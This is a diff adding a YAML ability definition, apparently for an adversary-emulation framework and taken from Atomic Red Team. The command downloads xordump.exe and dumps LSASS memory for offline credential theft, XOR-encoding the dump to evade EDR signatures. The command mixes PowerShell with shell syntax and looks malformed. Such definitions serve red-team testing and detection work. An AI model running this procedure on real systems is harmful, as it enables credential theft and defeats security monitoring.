@@ -1,0 +1,58 @@
+- id: 86fc3f40-237f-4701-b155-81c01c48d697
+  name: Dump LSASS.exe using imported Microsoft DLLs
+  description: "The memory of lsass.exe is often dumped for offline credential theft\
+    \ attacks. This can be achieved by\nimporting built-in DLLs and calling exported\
+    \ functions. Xordump will re-read the resulting minidump \nfile and delete it\
+    \ immediately to avoid brittle EDR detections that signature lsass minidump files.\n\
+    \nUpon successful execution, you should see the following file created $env:TEMP\\\
+    lsass-xordump.t1003.001.dmp."
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path ''C:\Windows\Temp\xordump.exe'') {exit 0} else {exit
+          1}; then : ; else [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          Invoke-WebRequest "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe"
+          -OutFile C:\Windows\Temp\xordump.exe; fi; C:\Windows\Temp\xordump.exe -out
+          C:\Windows\Temp\lsass-xordump.t1003.001.dmp -x 0x41'
+        cleanup: 'Remove-Item #{output_file} -ErrorAction Ignore'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - credential-access
+  - t1003.001
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      xordump_exe:
+        description: Path to xordump
+        type: path
+        default: C:\Windows\Temp\xordump.exe
+      output_file:
+        description: Path where resulting dump should be placed
+        type: path
+        default: C:\Windows\Temp\lsass-xordump.t1003.001.dmp
+    dependencies:
+    - description: 'Computer must have xordump.exe
+
+        '
+      prereq_command: 'if (Test-Path ''#{xordump_exe}'') {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+        Invoke-WebRequest "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe"
+        -OutFile #{xordump_exe}
+
+        '
+    technique_created: '2020-02-11T18:41:44.783Z'
+    atomic_guid: 86fc3f40-237f-4701-b155-81c01c48d697
+    import_timestamp: '2025-06-24T11:15:06.603616Z'
